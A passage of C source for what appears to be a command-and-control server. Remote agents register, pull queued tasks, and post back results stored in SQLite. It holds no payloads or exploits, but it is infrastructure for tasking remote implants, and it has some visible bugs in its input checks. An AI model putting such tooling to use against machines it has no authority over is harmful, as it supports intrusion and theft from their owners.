
#include "jansson.h"
#include "sqlite3.h"
#include "uuid/uuid.h"
#include "handlers.h"
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
//#include <uuid/uuid.h>
#include "hash-table.h"
#include "http-parser.h"

int router(struct http_response *http_response, struct http_request *http_request) {
    char *method = http_request->req_line.method;
    char *path = http_request->req_line.origin;
    if (strncmp(path, "/agents", 5) == 0) {
        if (strcmp(method, "POST") == 0) {
            return post_agents(http_response, http_request);
        }
        else if (strcmp(method, "GET") == 0) {
            return get_agents(http_response, http_request);
        }
    }
    else if (strncmp(path, "/tasks", 5) == 0) {
        if (strcmp(method, "POST") == 0) {
            return post_tasks(http_response, http_request);
        }
        else if (strcmp(method, "GET") == 0) {
            return get_tasks(http_response, http_request);
        }
    }
    else if (strncmp(path, "/results", 5) == 0) {
        if (strcmp(method, "POST") == 0) {
            return post_results(http_response, http_request);
        }
        else if (strcmp(method, "GET") == 0) {
            return get_results(http_response, http_request);
        }
    }
    return not_found(http_response);
    //0 is the success code, 404 should probably be considered a 0, error codes are for crashes
}

//---util-functions---//
int not_found(struct http_response *http_response) {
    http_response->stat_line.status_code = 404; //bad request
    http_response->stat_line.reason = NULL;
    http_response->content_length = 0;
    return 0;
}
int bad_request(struct http_response *http_response) {
    http_response->stat_line.status_code = 400; //bad request
    http_response->stat_line.reason = NULL;
    http_response->content_length = 0;
    return 0;
}
//sqlite3 call backs
int sql_to_json (void *response_root, int count, char **col_text, char **col_name){
    json_t *array = response_root;
    json_t *row_obj = json_object();
    if (!row_obj) {
        return -1;
    }
    for (int i = 0; i < count; i++) {
        const char *name = col_name[i];
        const char *val = col_text[i];
        if (val) {
            json_object_set_new(row_obj, name, json_string(val));
        } else {
            json_object_set_new(row_obj, name, json_null());
        }
    }
    json_array_append_new(array, row_obj);
    return 0;
}
//---end-of-util-functions---//

int post_agents(struct http_response *http_response, struct http_request *http_request) {
    struct_header *req_content_type = hash_lookup_node(http_request->headers, "content-type");
    if (req_content_type == NULL) {
        return bad_request(http_response);
    }
    if (strcmp(req_content_type->value, "application/json") != 0) {
        http_response->stat_line.status_code = 415; //unsupported media type
        http_response->stat_line.reason = NULL;
        http_response->content_length = 0;
        http_response->headers = hash_init_table();
        struct_header *accept_post = calloc(1, sizeof(struct_header));
        if (accept_post == NULL) {
            return -1;
        }
        accept_post->key = strdup("Accept-Post");
        accept_post->value = strdup("application/json");
        hash_add_node(http_response->headers, accept_post);
        return 0;
    } //else, json data:

    json_t *root, *response_root;
    json_error_t error;

    root = json_loadb(http_request->body, http_request->content_length, 0, &error);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", error.line, error.text);
        return -1;
    }
    if (!json_is_object(root)) {
        fprintf(stderr, "error: bad POST agents data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    json_t *handle_json, *hostname_json;
    const char *handle_str, *hostname_str;
    handle_json = json_object_get(root, "handle");
    if (!json_is_string(handle_json)) {
        fprintf(stderr, "error: bad POST agents data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    handle_str = json_string_value(handle_json);
    hostname_json = json_object_get(root, "hostname");
    if (!json_is_string(hostname_json)) {
        fprintf(stderr, "error: bad POST agents data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    hostname_str = json_string_value(hostname_json);
    //generate agent uuid
    uuid_t uuid;
    char uuid_str[37];
    uuid_generate(uuid);
    uuid_unparse_lower(uuid, uuid_str);

    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        json_decref(root);
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);
    const char *sql = "INSERT INTO agents (uuid, hostname, handle) "  \
        "VALUES (?1, ?2, ?3); ";
    sqlite3_stmt *ppstmt;
    rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    }
    sqlite3_bind_text(ppstmt, 1, uuid_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt, 2, hostname_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt, 3, handle_str, -1, SQLITE_STATIC);
    rc = sqlite3_step(ppstmt);
    if (rc != SQLITE_ROW && rc != SQLITE_DONE) {
        fprintf(stderr, "error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    }
    fprintf(stdout, "Records created successfully\n");
    sqlite3_finalize(ppstmt);
    sqlite3_close(db_handle);

    //turn uuid into json object and send it
    http_response->stat_line.status_code = 200;
    http_response->stat_line.reason = NULL;
    response_root = json_pack("{s:s}", "uuid", uuid_str);
    http_response->content_length = json_dumpb(response_root, NULL, 0, 0);
    if (http_response->content_length == 0) {
        fprintf(stderr, "json dump failed.\n");
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    http_response->body = malloc(http_response->content_length);
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    http_response->content_length = json_dumpb(response_root, http_response->body,
        http_response->content_length, 0);
    //set headers
    http_response->headers = hash_init_table();
    if (http_response->headers == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("application/json");
    hash_add_node(http_response->headers, content_type);
    //success
    json_decref(response_root);
    json_decref(root);
    return 0;
}

int get_agents(struct http_response *http_response, struct http_request *http_request) {
    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);

    char *path = http_request->req_line.origin;
    char *sql;
    sqlite3_stmt *ppstmt = NULL;

    path += strlen("/agents");
    if (*path == '\0') {
        //return all agents
        sql = "SELECT * FROM agents";
        rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
        if (rc != SQLITE_OK) {
            fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
            sqlite3_close(db_handle);
            return -1;
        }
    }
    else if (*path == '?') {
        //return a particular agent
        char *needle = strstr(path, "handle=");
        if (needle == NULL) {
            fprintf(stderr, "no handle in query string\n");
            sqlite3_close(db_handle);
            return bad_request(http_response);
        }
        char *agent_handle = strdup(needle + strlen("handle="));
        if (agent_handle == NULL) {
            fprintf(stderr, "malloc: %s", strerror(errno));
            sqlite3_close(db_handle);
            return -1;
        }
        agent_handle[strcspn(agent_handle, "&")] = '\0'; //replace ampersand with null byte
        //could add decoding of url encoded ampersand here

        sql= "SELECT * FROM agents WHERE handle = ?;";

        rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
        if (rc != SQLITE_OK) {
            fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
            sqlite3_close(db_handle);
            free(agent_handle);
            return -1;
        }
        sqlite3_bind_text(ppstmt, 1, agent_handle, -1, free); //frees agent_handle here
    }
    else {
        sqlite3_close(db_handle);
        return bad_request(http_response);
    }
    //ppstmt is prepared and bound by this point.
    json_t *response_root = json_array();
    if (response_root == NULL) {
        fprintf(stderr, "jannson alloc\n");
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        return -1;
    }
    while ((rc = sqlite3_step(ppstmt)) == SQLITE_ROW) {
        json_t *row_obj = json_object();
        if (row_obj == NULL) {
            fprintf(stderr, "jannson alloc\n");
            json_decref(response_root);
            sqlite3_finalize(ppstmt);
            sqlite3_close(db_handle);
            return -1;
        }
        int col_count = sqlite3_column_count(ppstmt);
        for (int i = 0; i < col_count; i++) {
            const char *col_name = sqlite3_column_name(ppstmt, i);
            int col_type = sqlite3_column_type(ppstmt, i);
            switch (col_type) {
                case SQLITE_INTEGER:
                    json_object_set_new(row_obj, col_name,
                                        json_integer(sqlite3_column_int64(ppstmt, i)));
                    break;
                case SQLITE_FLOAT:
                    json_object_set_new(row_obj, col_name,
                                        json_real(sqlite3_column_double(ppstmt, i)));
                    break;
                case SQLITE_TEXT:
                    json_object_set_new(row_obj, col_name,
                                        json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
                case SQLITE_NULL:
                    json_object_set_new(row_obj, col_name, json_null());
                    break;
                default:
                    // Fallback to string
                    json_object_set_new(row_obj, col_name,
                                        json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
            }
        }

        json_array_append_new(response_root, row_obj);
    }
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "error reading rows: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        json_decref(response_root);
        return -1;
    }
    sqlite3_finalize(ppstmt);
    sqlite3_close(db_handle);

    //response_root must be ready
    http_response->stat_line.status_code = 200;
    http_response->stat_line.reason = NULL;
    http_response->content_length = json_dumpb(response_root, NULL, 0, 0);
    if (http_response->content_length == 0) {
        fprintf(stderr, "json dump failed.\n");
        json_decref(response_root);
        return -1;
    }
    http_response->body = malloc(http_response->content_length);
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    http_response->content_length = json_dumpb(response_root, http_response->body,
        http_response->content_length, 0);
    //set headers
    http_response->headers = hash_init_table();
    if (http_response->headers == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("application/json");
    hash_add_node(http_response->headers, content_type);
    //success
    json_decref(response_root);
    return 0;
}

int post_tasks(struct http_response *http_response, struct http_request *http_request) {
    //lots of duplicate code, may have to wrap some in a macro or a function
    struct_header *req_content_type = hash_lookup_node(http_request->headers, "content-type");
    if (req_content_type == NULL) {
        return bad_request(http_response);
    }
    if (strcmp(req_content_type->value, "application/json") != 0) {
        http_response->stat_line.status_code = 415; //unsupported media type
        http_response->stat_line.reason = NULL;
        http_response->content_length = 0;
        http_response->headers = hash_init_table();
        struct_header *accept_post = calloc(1, sizeof(struct_header));
        if (accept_post == NULL) {
            return -1;
        }
        accept_post->key = strdup("Accept-Post");
        accept_post->value = strdup("application/json");
        hash_add_node(http_response->headers, accept_post);
        return 0;
    } //else, json data:

    json_t *root, *response_root;
    json_error_t error;

    root = json_loadb(http_request->body, http_request->content_length, 0, &error);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", error.line, error.text);
        return -1;
    }
    if (!json_is_object(root)) {
        fprintf(stderr, "error: bad POST tasks data\n");
        json_decref(root);
        return bad_request(http_response);
    }

    json_t *category_json, *agent_id_json, *options_json;
    const char *category_str, *agent_id_str;
    char *options_str;

    category_json = json_object_get(root, "category");
    if (!json_is_string(category_json)) {
        fprintf(stderr, "error: bad POST tasks data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    category_str = json_string_value(category_json);
    agent_id_json = json_object_get(root, "agent_id");
    if (!json_is_string(agent_id_json)) {
        fprintf(stderr, "error: bad POST tasks data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    agent_id_str = json_string_value(agent_id_json);
    options_json = json_object_get(root, "options");
    if (!json_is_object(options_json)) {
        fprintf(stderr, "error: bad POST tasks data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    options_str = json_dumps(options_json, 0);
    if (options_str == NULL) {
        fprintf(stderr, "json dumps failed.\n");
        json_decref(root);
        return -1;
    }
    //check if agent_id is valid
    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        free(options_str);
        json_decref(root);
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);

    const char *sql = "SELECT EXISTS(SELECT 1 FROM agents WHERE uuid = ?);";
    sqlite3_stmt *ppstmt1;
    int exists = 0;
    if (sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt1, NULL) == SQLITE_OK) {
        sqlite3_bind_text(ppstmt1, 1, agent_id_str, -1, SQLITE_STATIC);
        rc = sqlite3_step(ppstmt1);
        if (rc == SQLITE_ROW) {
            exists = sqlite3_column_int(ppstmt1, 0); // 1 if exists, 0 if not
        }
        else {
            fprintf(stderr, "error: %s\n", sqlite3_errmsg(db_handle));
            sqlite3_finalize(ppstmt1);
            sqlite3_close(db_handle);
            free(options_str);
            json_decref(root);
            return -1;
        }
    }
    sqlite3_finalize(ppstmt1);
    if (exists == 0) {
        bad_request(http_response);
        char *http_err_msg = strdup("agent id must correspond to an existing agent uuid.");
        http_response->headers = hash_init_table();
        struct_header *content_type = calloc(1, sizeof(struct_header));
        if (content_type == NULL || http_err_msg == NULL) {
            fprintf(stderr, "malloc: %s\n", strerror(errno));
            sqlite3_close(db_handle);
            free(options_str);
            json_decref(root);
            return -1;
        }
        content_type->key = strdup("Content-Type");
        content_type->value = strdup("text/plain");
        hash_add_node(http_response->headers, content_type);
        http_response->body = http_err_msg;
        http_response->content_length = strlen(http_err_msg);
        sqlite3_close(db_handle);
        free(options_str);
        json_decref(root);
        return 0;
    }
    //valid agent id
    //gen uuid
    uuid_t uuid;
    char uuid_str[37];
    uuid_generate(uuid);
    uuid_unparse_lower(uuid, uuid_str);

    //set task queue no to primary key so it would auto incr (chose this)
    //could also use agent id to return highest queue
    //no where is done is false then incr it and store as queue no

    const char *sql2 = "INSERT INTO tasks (uuid, category, agent_id, options, status, result) "  \
        "VALUES (?1, ?2, ?3, ?4, 0, NULL); ";
    sqlite3_stmt *ppstmt2;
    rc = sqlite3_prepare_v2(db_handle, sql2, -1, &ppstmt2, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_close(db_handle);
        free(options_str);
        json_decref(root);
        return -1;
    }
    sqlite3_bind_text(ppstmt2, 1, uuid_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt2, 2, category_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt2, 3, agent_id_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt2, 4, options_str, -1, SQLITE_STATIC);

    rc = sqlite3_step(ppstmt2);
    if (rc != SQLITE_ROW && rc != SQLITE_DONE) {
        fprintf(stderr, "error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt2);
        sqlite3_close(db_handle);
        free(options_str);
        json_decref(root);
        return -1;
    }
    fprintf(stdout, "Records created successfully\n");
    sqlite3_finalize(ppstmt2);
    sqlite3_close(db_handle);
    free(options_str);
    //respond with uuid
    http_response->stat_line.status_code = 200;
    http_response->stat_line.reason = NULL;
    response_root = json_pack("{s:s}", "uuid", uuid_str);
    http_response->content_length = json_dumpb(response_root, NULL, 0, 0);
    if (http_response->content_length == 0) {
        fprintf(stderr, "json dump failed.\n");
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    http_response->body = malloc(http_response->content_length);
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    http_response->content_length = json_dumpb(response_root, http_response->body,
        http_response->content_length, 0);
    //set headers
    http_response->headers = hash_init_table();
    if (http_response->headers == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        json_decref(root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("application/json");
    hash_add_node(http_response->headers, content_type);
    //success
    json_decref(response_root);
    json_decref(root);
    return 0;
}
int get_tasks(struct http_response *http_response, struct http_request *http_request) {
    char *agent_id_param;
    char *path = http_request->req_line.origin;
    path += strlen("/tasks");
    if (*path == '?') {
        char *needle = strstr(path, "id=");
        if (needle == NULL) {
            fprintf(stderr, "no id (agent) in query string\n");
            return bad_request(http_response);
        }
        needle[strcspn(needle, "&")] = '\0';

        if (strlen(needle) < strlen("id=") + 36) {
            fprintf(stderr, "agent id too short\n");
            return bad_request(http_response);
        }
        agent_id_param = needle + strlen("id=");
    }
    else {
        return bad_request(http_response);
    } //agent_id_str is valid
    //open database
    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);

    const char *sql = "SELECT * FROM tasks "
    "WHERE agent_id = ?1 AND status = 0 "
    "ORDER BY queue_no LIMIT 1; "; //could make limit
    //a macro to return more than one tasks,
    //after making sure the agent supports it
    sqlite3_stmt *ppstmt = NULL;
    rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_close(db_handle);
        return -1;
    }
    sqlite3_bind_text(ppstmt, 1, agent_id_param, -1, SQLITE_STATIC);
    //duplicate of get_agents:
    json_t *response_root = json_array();
    if (response_root == NULL) {
        fprintf(stderr, "jannson alloc\n");
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        return -1;
    }
    while ((rc = sqlite3_step(ppstmt)) == SQLITE_ROW) {
        json_t *row_obj = json_object();
        if (row_obj == NULL) {
            fprintf(stderr, "jannson alloc\n");
            json_decref(response_root);
            sqlite3_finalize(ppstmt);
            sqlite3_close(db_handle);
            return -1;
        }
        int col_count = sqlite3_column_count(ppstmt);
        for (int i = 0; i < col_count; i++) {
            const char *col_name = sqlite3_column_name(ppstmt, i);
            int col_type = sqlite3_column_type(ppstmt, i);
            switch (col_type) {
                case SQLITE_INTEGER:
                    json_object_set_new(row_obj, col_name,
                                        json_integer(sqlite3_column_int64(ppstmt, i)));
                    break;
                case SQLITE_FLOAT:
                    json_object_set_new(row_obj, col_name,
                                        json_real(sqlite3_column_double(ppstmt, i)));
                    break;
                case SQLITE_TEXT:
                    json_object_set_new(row_obj, col_name,
                                    json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
                case SQLITE_NULL:
                    json_object_set_new(row_obj, col_name, json_null());
                    break;
                default:
                    // Fallback to string
                    json_object_set_new(row_obj, col_name,
                                        json_string((const char *)sqlite3_column_text(ppstmt, i)));
                    break;
            }
        }

        json_array_append_new(response_root, row_obj);
    }
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "error reading rows: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        json_decref(response_root);
        return -1;
    }
    sqlite3_finalize(ppstmt);
    //sqlite3_close(db_handle);

    http_response->stat_line.status_code = 200;
    http_response->stat_line.reason = NULL;
    http_response->content_length = json_dumpb(response_root, NULL, 0, 0);
    if (http_response->content_length == 0) {
        fprintf(stderr, "json dump failed.\n");
        json_decref(response_root);
        return -1;
    }
    http_response->body = malloc(http_response->content_length);
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    http_response->content_length = json_dumpb(response_root, http_response->body,
        http_response->content_length, 0);
    //set headers
    http_response->headers = hash_init_table();
    if (http_response->headers == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        json_decref(response_root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("application/json");
    hash_add_node(http_response->headers, content_type);
    //success
    json_decref(response_root);

    //update tasks to pending
    const char *sql2 = "UPDATE tasks "
    "SET status = 1 " //pending task
    "WHERE agent_id = ?1 AND status = 0; ";
    sqlite3_stmt *ppstmt2;
    rc = sqlite3_prepare_v2(db_handle, sql2, -1, &ppstmt2, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_close(db_handle);
        return -1;
    }
    sqlite3_bind_text(ppstmt2, 1, agent_id_param, -1, SQLITE_STATIC);
    rc = sqlite3_step(ppstmt2);
    if (rc != SQLITE_DONE) {
        fprintf(stderr, "error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt2);
        sqlite3_close(db_handle);
        return -1;
    }
    sqlite3_finalize(ppstmt2);
    sqlite3_close(db_handle);
    return 0;
}

int post_results(struct http_response *http_response, struct http_request *http_request) {
    //for binary data we can make it session based and add a /binresult endpoint that
    //can be used to write to database providing the valid sessionId (/results has Set-Cookie)
    //or we can recieve binary data like so: first 72 bytes are agent and task id respectively.
    //then we have binary data.
    //for now i will just use base64 encoding for binary
    //result: {"type":"text", "data":"..."}
    //result: {"type":"bin", "datab64":"..."}
    struct_header *req_content_type = hash_lookup_node(http_request->headers, "content-type");
    if (req_content_type == NULL) {
        return bad_request(http_response);
    }
    if (strcmp(req_content_type->value, "application/json") != 0) {
        http_response->stat_line.status_code = 415; //unsupported media type
        http_response->stat_line.reason = NULL;
        http_response->content_length = 0;
        http_response->headers = hash_init_table();
        struct_header *accept_post = calloc(1, sizeof(struct_header));
        if (accept_post == NULL) {
            return -1;
        }
        accept_post->key = strdup("Accept-Post");
        accept_post->value = strdup("application/json");
        hash_add_node(http_response->headers, accept_post);
        return 0;
    } //else, json data:

    json_t *root;
    json_error_t error;
    root = json_loadb(http_request->body, http_request->content_length, 0, &error);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", error.line, error.text);
        return -1;
    }
    if (!json_is_object(root)) {
        fprintf(stderr, "error: bad POST results data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    json_t *agent_id_json, *task_id_json, *result_json;
    const char *agent_id_str, *task_id_str;
    char *result_str;

    agent_id_json = json_object_get(root, "agent_id");
    if (!json_is_string(agent_id_json)) {
        fprintf(stderr, "error: bad POST result data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    agent_id_str = json_string_value(agent_id_json);
    task_id_json = json_object_get(root, "task_id");
    if (!json_is_string(agent_id_json)) {
        fprintf(stderr, "error: bad POST result data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    task_id_str = json_string_value(task_id_json);
    result_json = json_object_get(root, "result");
    if (!json_is_object(result_json)) {
        fprintf(stderr, "error: bad POST result data\n");
        json_decref(root);
        return bad_request(http_response);
    }
    result_str = json_dumps(result_json, 0);
    if (result_str == NULL) {
        fprintf(stderr, "json dumps failed.\n");
        json_decref(root);
        return -1;
    }
    //parsed json, open database
    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        json_decref(root);
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);

    const char *sql = "UPDATE tasks "
    "SET result = ?1, status = 2 "
    "WHERE uuid = ?2 AND agent_id = ?3;";
    sqlite3_stmt *ppstmt;
    rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    }
    sqlite3_bind_text(ppstmt, 1, result_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt, 2, task_id_str, -1, SQLITE_STATIC);
    sqlite3_bind_text(ppstmt, 3, agent_id_str, -1, SQLITE_STATIC);
    rc = sqlite3_step(ppstmt);
    if (rc != SQLITE_ROW && rc != SQLITE_DONE) {
        fprintf(stderr, "error: %s\n", sqlite3_errmsg(db_handle));
        sqlite3_finalize(ppstmt);
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    } //no errors:
    sqlite3_finalize(ppstmt);

    int rows_affected = sqlite3_changes(db_handle);
    if (rows_affected == 0) {
        printf("No rows matched the criteria.\n");
        http_response->stat_line.status_code = 400;
        http_response->body = strdup("couldn't update results: no id matches");
    } else {
        printf("%d row(s) updated successfully.\n", rows_affected);
        http_response->stat_line.status_code = 200;
        http_response->body = strdup("task result updated");
    }
    if (http_response->body == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    }
    http_response->headers = hash_init_table();
    struct_header *content_type = calloc(1, sizeof(struct_header));
    if (content_type == NULL) {
        fprintf(stderr, "malloc: %s\n", strerror(errno));
        sqlite3_close(db_handle);
        json_decref(root);
        return -1;
    }
    content_type->key = strdup("Content-Type");
    content_type->value = strdup("text/plain");
    hash_add_node(http_response->headers, content_type);
    http_response->content_length = strlen(http_response->body);
    sqlite3_close(db_handle);
    json_decref(root);
    return 0;
}
int get_results(struct http_response *http_response, struct http_request *http_request) {
    //a lot of duplicating from get_agents since it's the same logic
    sqlite3 *db_handle;
    int rc;
    rc = sqlite3_open_v2(C2_DB_PATH, &db_handle, SQLITE_OPEN_NOMUTEX | SQLITE_OPEN_READWRITE, NULL);
    if(rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db_handle));
        return -1;
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }
    sqlite3_busy_timeout(db_handle, BUSY_TIMEOUT);

    char *path = http_request->req_line.origin;
    char *sql;
    sqlite3_stmt *ppstmt = NULL;
    path += strlen("/results");
    if (*path == '\0') {
        //return all agents' results
        sql = "SELECT * FROM tasks WHERE status = 2;";
        rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
        if (rc != SQLITE_OK) {
            fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
            sqlite3_close(db_handle);
            return -1;
        }
    }
    else if (*path == '?') {
        //return a particular agent's results
        char *agent_id_param = NULL;
        char *task_id_param = NULL;
        char *agent_needle = strstr(path, "agent-id=");
        if (agent_needle != NULL) {
            agent_id_param = strdup(agent_needle + strlen("agent-id="));
            if (agent_id_param == NULL) {
                fprintf(stderr, "malloc: %s", strerror(errno));
                sqlite3_close(db_handle);
                return -1;
            }
            agent_id_param[strcspn(agent_id_param, "&")] = '\0';
        }
        char *task_needle = strstr(path, "task-id=");
        if (task_needle != NULL) {
            task_id_param = strdup(task_needle + strlen("task-id="));
            if (task_id_param == NULL) {
                fprintf(stderr, "malloc: %s", strerror(errno));
                if (agent_id_param)
                    free(agent_id_param);
                sqlite3_close(db_handle);
                return -1;
            }
            task_id_param[strcspn(task_id_param, "&")] = '\0';
        }
        if (!agent_id_param && !task_id_param) {
            fprintf(stderr, "no agent-id or task-id in query string\n");
            sqlite3_close(db_handle);
            return bad_request(http_response);

        } else if (agent_id_param && !task_id_param)
        {
            sql = "SELECT * FROM tasks WHERE status = 1 AND agent_id = ?1;";

            rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
            if (rc != SQLITE_OK) {
                fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
                sqlite3_close(db_handle);
                free(agent_id_param);
                return -1;
            }
            sqlite3_bind_text(ppstmt, 1, agent_id_param, -1, free); //frees agent param

        } else if (!agent_id_param && task_id_param)
        {
            sql = "SELECT * FROM tasks WHERE status = 2 AND uuid = ?1;";

            rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
            if (rc != SQLITE_OK) {
                fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
                sqlite3_close(db_handle);
                free(task_id_param);
                return -1;
            }
            sqlite3_bind_text(ppstmt, 1, task_id_param, -1, free); //frees task param
        } else //(agent_id_param && task_id_param)
        {
            sql = "SELECT * FROM tasks WHERE status = 2 AND agent_id = ?1 AND uuid = ?2";

            rc = sqlite3_prepare_v2(db_handle, sql, -1, &ppstmt, NULL);
            if (rc != SQLITE_OK) {
                fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db_handle));
                sqlite3_close(db_handle);
                free(agent_id_param);
                free(task_id_param);
                return -1;
            }
            sqlite3_bind_text(ppstmt, 1, agent_id_param, -1, free); //frees agent param
